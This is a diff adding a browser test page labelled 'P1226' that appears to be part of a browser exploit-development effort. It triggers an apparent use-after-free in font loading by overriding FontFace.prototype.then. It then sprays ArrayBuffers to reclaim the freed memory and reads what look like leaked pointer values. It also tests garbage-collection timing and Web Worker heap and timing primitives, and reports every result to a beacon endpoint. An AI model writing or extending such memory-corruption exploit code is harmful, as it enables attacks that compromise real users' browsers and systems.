@@ -1,0 +1,386 @@
+<!DOCTYPE html><html><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>P1226 teacher GC + workers</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#050508;color:#e8ffe8;font:13px/1.4 'Courier New',monospace;padding:10px}
+#s{font-size:18px;font-weight:bold;color:#ffd75e;padding:8px 0}
+#r{color:#ff55c8;white-space:pre-wrap;word-break:break-all;font-size:12px;line-height:1.6}
+</style>
+</head><body>
+<div id="s">P1226 BOOTING...</div>
+<div id="r"></div>
+<script>
+'use strict';
+/* ═══════════════════════════════════════════════════════════════════
+   P1226: Teacher-advised GC protocol + Worker exploration
+
+   PART A: CLEAN CSSFontFace reclaim (FIRST, no pollution)
+   PART B: Teacher GC protocol:
+     - Access .loaded
+     - Chain .then() that does NOT capture FontFace
+     - Null ref in a separate setTimeout AFTER settlement
+     - Run GC pressure in yet another setTimeout
+     - Check WeakRef only from a DIFFERENT setTimeout than GC
+   PART C: Worker capability exploration
+     - Worker heap sharing with main thread
+     - Worker-to-main ArrayBuffer transfer
+     - Worker timing precision
+   ═══════════════════════════════════════════════════════════════════ */
+
+var S=document.getElementById('s'),R=document.getElementById('r');
+function msg(t){R.textContent+=(R.textContent?'\n':'')+t;}
+
+function B(tag,data){
+  try{
+    var u='/beacon.php?tag=P1226-'+encodeURIComponent(tag);
+    if(data)u+='&data='+encodeURIComponent(String(data).slice(0,900));
+    u+='&t='+Date.now();
+    var x=new XMLHttpRequest();x.open('GET',u,false);x.send(null);
+  }catch(e){}
+}
+window.onerror=function(m,s,l){B('ERR',m+'@'+l);};
+
+function hex(v){return('0'+v.toString(16)).slice(-2);}
+
+B('START','teacher-gc-workers');
+S.textContent='P1226 RUNNING...';
+msg('=== P1226: Teacher GC protocol + Workers ===');
+msg('');
+
+/* ═══════ PART A: CLEAN CSSFontFace reclaim (FIRST!) ═══════ */
+msg('=== PART A: Clean reclaim ===');
+
+var K=12,SIZE=192;
+var s1data=null,hitIdx=-1,hitMap=null;
+
+var styleEl=document.createElement('style');
+styleEl.textContent="@font-face{font-family:s0;src:local(Arial);unicode-range:U+0042;}";
+document.head.appendChild(styleEl);
+var A0=new FontFace('f0','local(Helvetica)',{unicodeRange:'U+0041'});
+document.fonts.add(A0);
+void A0.loaded;
+window.__alive=[A0];
+
+var firedS1=false;
+Object.defineProperty(FontFace.prototype,'then',{
+  configurable:true,
+  get:function(){
+    if(firedS1)return undefined;
+    firedS1=true;
+    if(styleEl)styleEl.remove();
+    try{document.fonts.delete(this);}catch(e){}
+    styleEl=null;
+    document.body.offsetHeight;
+    window.__map1=[];
+    for(var k=0;k<K;k++){
+      var ab=new ArrayBuffer(SIZE);
+      window.__map1.push({view:new Uint8Array(ab),bv:new BigUint64Array(ab),ab:ab});
+    }
+    try{document.fonts.check('1em s0');}catch(e){}
+    return undefined;
+  },
+  set:function(){}
+});
+
+document.fonts.load('1em f0, s0','AB').then(function(){B('A-S1-OK','resolved');},function(){});
+
+setTimeout(function(){
+  var m=window.__map1;
+  if(!m||!m.length){B('A-S1-NOMAP','err');doPartB();return;}
+  var best=-1,nz=0;
+  for(var i=0;i<m.length;i++){
+    var v=m[i].view,n=0;
+    for(var j=0;j<v.length;j++)if(v[j]!==0)n++;
+    if(n>nz){nz=n;best=i;}
+  }
+  if(best<0){B('A-S1-CLEAN','no-hit');doPartB();return;}
+
+  hitIdx=best;hitMap=m;
+  s1data=new Uint8Array(SIZE);
+  for(var i=0;i<SIZE;i++)s1data[i]=m[best].view[i];
+
+  var p58='';for(var i=0;i<8;i++)p58+=hex(s1data[0x58+i]);
+  var p68='';for(var i=0;i<8;i++)p68+=hex(s1data[0x68+i]);
+  B('A-HIT','buf'+best+'|nz='+nz+'|p58='+p58+'|p68='+p68);
+  msg('PART A HIT: buf'+best+' p58='+p58+' p68='+p68);
+
+  doPartB();
+},150);
+
+/* ═══════ PART B: Teacher-advised GC protocol ═══════ */
+function doPartB(){
+  msg('');msg('=== PART B: Teacher GC protocol ===');
+
+  var finReg=new FinalizationRegistry(function(tag){
+    B('FIN-'+tag,'collected');
+    msg('FinReg: '+tag+' COLLECTED!');
+  });
+
+  var weakRefs={};
+
+  /* gc1: control — no .loaded */
+  var gc1=new FontFace('gc1','local(Arial)',{unicodeRange:'U+0051'});
+  weakRefs.gc1=new WeakRef(gc1);
+  finReg.register(gc1,'gc1');
+  gc1=null;
+
+  /* gc2: .loaded with .then() settlement detection, null AFTER settle */
+  var gc2=new FontFace('gc2','local(Arial)',{unicodeRange:'U+0052'});
+  weakRefs.gc2=new WeakRef(gc2);
+  finReg.register(gc2,'gc2');
+
+  /* Teacher protocol: chain .then() that does NOT capture gc2 */
+  var gc2settled=false;
+  gc2.loaded.then(function(){
+    /* This closure does NOT reference gc2 */
+    gc2settled=true;
+    B('GC2-SETTLED','promise-resolved');
+  });
+  /* Do NOT null gc2 yet — wait for settlement */
+
+  /* gc3: .loaded with void (old protocol), null immediately */
+  var gc3=new FontFace('gc3','local(Arial)',{unicodeRange:'U+0053'});
+  weakRefs.gc3=new WeakRef(gc3);
+  finReg.register(gc3,'gc3');
+  void gc3.loaded;
+  gc3=null;
+
+  /* gc4: .loaded.then() with settlement, null in SEPARATE setTimeout */
+  var gc4=new FontFace('gc4','local(Arial)',{unicodeRange:'U+0054'});
+  weakRefs.gc4=new WeakRef(gc4);
+  finReg.register(gc4,'gc4');
+  var gc4settled=false;
+  gc4.loaded.then(function(){
+    gc4settled=true;
+    B('GC4-SETTLED','resolved');
+    /* Null gc4 in the SAME microtask as settlement */
+  });
+
+  /* gc5: .loaded.then(), null in setTimeout(0) AFTER settlement */
+  var gc5=new FontFace('gc5','local(Arial)',{unicodeRange:'U+0055'});
+  weakRefs.gc5=new WeakRef(gc5);
+  finReg.register(gc5,'gc5');
+  gc5.loaded.then(function(){
+    B('GC5-SETTLED','resolved');
+    /* Schedule null in next task */
+    setTimeout(function(){
+      gc5=null;
+      B('GC5-NULLED','in-settimeout-0');
+    },0);
+  });
+
+  /* Null gc2 and gc4 after 100ms (well past local() settlement) */
+  setTimeout(function(){
+    gc2=null;gc4=null;
+    B('GC2-4-NULLED','after-100ms|gc2settled='+gc2settled+'|gc4settled='+gc4settled);
+    msg('gc2/gc4 nulled, settled='+gc2settled+'/'+gc4settled);
+  },100);
+
+  /* GC PRESSURE starts at 300ms — separate from nulling */
+  setTimeout(function(){
+    msg('GC pressure starting...');
+    var wave=0,maxW=60;
+
+    function gcWave(){
+      /* Heavy JS-heap pressure */
+      var j=[];
+      for(var i=0;i<8000;i++){
+        j.push({a:i,b:'gcw'+i+'_'.repeat(20)+Math.random(),c:[i],d:function(){return i;}});
+      }
+      for(var i=0;i<2000;i++)j.push(new Map([[i,'v'+i]]));
+      for(var i=0;i<500;i++)j.push(new Set([i,i+1]));
+      for(var i=0;i<500;i++)j.push(Promise.resolve(i));
+      j=null;
+      wave++;
+
+      /* DO NOT CHECK WeakRef HERE — teacher says deref() pins */
+      /* Schedule check in a SEPARATE setTimeout(0) */
+      if(wave%10===0||wave===1||wave===2){
+        setTimeout(function(){
+          /* Now in a NEW microtask — safe to check */
+          var status=[];
+          for(var k in weakRefs){
+            var alive=weakRefs[k].deref()!==undefined;
+            status.push(k+'='+(alive?'LIVE':'DEAD'));
+          }
+          B('CHECK-W'+wave,status.join('|'));
+          msg('wave '+wave+': '+status.join(' '));
+        },0);
+      }
+
+      if(wave<maxW){
+        setTimeout(gcWave,15);
+      }else{
+        /* Final check in separate setTimeout */
+        setTimeout(function(){
+          var finalStatus=[];
+          for(var k in weakRefs){
+            var alive=weakRefs[k].deref()!==undefined;
+            finalStatus.push(k+'='+(alive?'LIVE':'DEAD'));
+          }
+          B('GC-FINAL',finalStatus.join('|')+'|wave='+wave);
+          msg('FINAL: '+finalStatus.join(' '));
+          doPartC();
+        },50);
+      }
+    }
+    gcWave();
+  },300);
+}
+
+/* ═══════ PART C: Worker exploration ═══════ */
+function doPartC(){
+  msg('');msg('=== PART C: Worker exploration ===');
+
+  /* Worker script as blob */
+  var workerCode=[
+    'var results={};',
+    '',
+    '// Feature detection inside Worker',
+    'results.self=typeof self;',
+    'results.location=self.location?self.location.href:"none";',
+    'try{results.perf=typeof performance!=="undefined"&&typeof performance.now==="function";}catch(e){results.perf=false;}',
+    'try{results.crypto=typeof crypto!=="undefined"&&typeof crypto.subtle!=="undefined";}catch(e){results.crypto=false;}',
+    'try{results.createImageBitmap=typeof createImageBitmap==="function";}catch(e){results.createImageBitmap=false;}',
+    'try{results.textEncoder=typeof TextEncoder!=="undefined";}catch(e){results.textEncoder=false;}',
+    'try{results.indexedDB=typeof indexedDB!=="undefined";}catch(e){results.indexedDB=false;}',
+    'try{results.caches=typeof caches!=="undefined";}catch(e){results.caches=false;}',
+    'try{results.fetch=typeof fetch==="function";}catch(e){results.fetch=false;}',
+    'try{results.XMLHttpRequest=typeof XMLHttpRequest==="function"||typeof XMLHttpRequest==="object";}catch(e){results.XMLHttpRequest=false;}',
+    '',
+    '// Timing precision test',
+    'if(results.perf){',
+    '  var times=[];',
+    '  for(var i=0;i<100;i++){',
+    '    var t1=performance.now();',
+    '    var t2=performance.now();',
+    '    if(t2>t1)times.push(t2-t1);',
+    '  }',
+    '  times.sort(function(a,b){return a-b;});',
+    '  results.timing_min=times[0];',
+    '  results.timing_median=times[Math.floor(times.length/2)];',
+    '  results.timing_samples=times.length;',
+    '}',
+    '',
+    '// ArrayBuffer transfer test — create buffer, send back',
+    'var testBuf=new ArrayBuffer(256);',
+    'var view=new Uint8Array(testBuf);',
+    'for(var i=0;i<256;i++)view[i]=i;',
+    '',
+    'self.onmessage=function(e){',
+    '  if(e.data==="features"){',
+    '    self.postMessage({type:"features",data:results});',
+    '  }else if(e.data==="transfer"){',
+    '    // Transfer an ArrayBuffer back to main thread',
+    '    var buf=new ArrayBuffer(192);',
+    '    var v=new Uint8Array(buf);',
+    '    for(var i=0;i<192;i++)v[i]=0xDE;',
+    '    self.postMessage({type:"transfer",buf:buf},[buf]);',
+    '    // buf is now detached in worker',
+    '    try{',
+    '      var v2=new Uint8Array(buf);',
+    '      self.postMessage({type:"detach-check",detached:false,len:v2.length});',
+    '    }catch(ex){',
+    '      self.postMessage({type:"detach-check",detached:true,err:ex.message});',
+    '    }',
+    '  }else if(e.data&&e.data.type==="alloc"){',
+    '    // Allocate N buffers of SIZE in worker heap',
+    '    var count=e.data.count||100;',
+    '    var size=e.data.size||192;',
+    '    var bufs=[];',
+    '    for(var i=0;i<count;i++){',
+    '      var ab=new ArrayBuffer(size);',
+    '      bufs.push(ab);',
+    '    }',
+    '    self.postMessage({type:"alloc-done",count:bufs.length});',
+    '    // Keep bufs alive',
+    '    self._bufs=bufs;',
+    '  }',
+    '};',
+    '',
+    'self.postMessage({type:"ready"});'
+  ].join('\n');
+
+  try{
+    var blob=new Blob([workerCode],{type:'application/javascript'});
+    var url=URL.createObjectURL(blob);
+    var w=new Worker(url);
+    var workerResults={};
+    var msgCount=0;
+
+    w.onmessage=function(e){
+      msgCount++;
+      var d=e.data;
+
+      if(d.type==='ready'){
+        B('WORKER-READY','ok');
+        msg('Worker ready');
+        w.postMessage('features');
+      }else if(d.type==='features'){
+        var feat=d.data;
+        var fstr=[];
+        for(var k in feat)fstr.push(k+'='+JSON.stringify(feat[k]));
+        B('WORKER-FEATURES',fstr.join('|').slice(0,900));
+        msg('Worker features: '+fstr.join(' '));
+        workerResults.features=feat;
+
+        /* Test ArrayBuffer transfer */
+        w.postMessage('transfer');
+      }else if(d.type==='transfer'){
+        var buf=d.buf;
+        if(buf instanceof ArrayBuffer){
+          var v=new Uint8Array(buf);
+          var ok=v[0]===0xDE&&v[191]===0xDE;
+          B('WORKER-TRANSFER','size='+buf.byteLength+'|ok='+ok);
+          msg('Transfer: '+buf.byteLength+'B, content ok='+ok);
+        }else{
+          B('WORKER-TRANSFER-FAIL','not-arraybuffer');
+        }
+      }else if(d.type==='detach-check'){
+        B('WORKER-DETACH','detached='+d.detached);
+        msg('Worker buf detached='+d.detached);
+
+        /* Test worker heap allocation */
+        w.postMessage({type:'alloc',count:200,size:192});
+      }else if(d.type==='alloc-done'){
+        B('WORKER-ALLOC','count='+d.count);
+        msg('Worker allocated '+d.count+' x 192B');
+
+        /* Done with worker tests */
+        w.terminate();
+        finalize();
+      }
+    };
+
+    w.onerror=function(e){
+      B('WORKER-ERR',e.message||'unknown');
+      msg('Worker error: '+(e.message||'unknown'));
+      finalize();
+    };
+
+    setTimeout(function(){
+      if(msgCount===0){
+        B('WORKER-TIMEOUT','no-messages');
+        msg('Worker: no response');
+        finalize();
+      }
+    },5000);
+
+  }catch(e){
+    B('WORKER-CREATE-ERR',e.message);
+    msg('Worker create error: '+e.message);
+    finalize();
+  }
+}
+
+function finalize(){
+  msg('');msg('=== P1226 COMPLETE ===');
+  S.textContent='P1226 COMPLETE';
+  B('DONE','all');
+}
+
+setTimeout(finalize,45000);
+</script>
+</body></html>
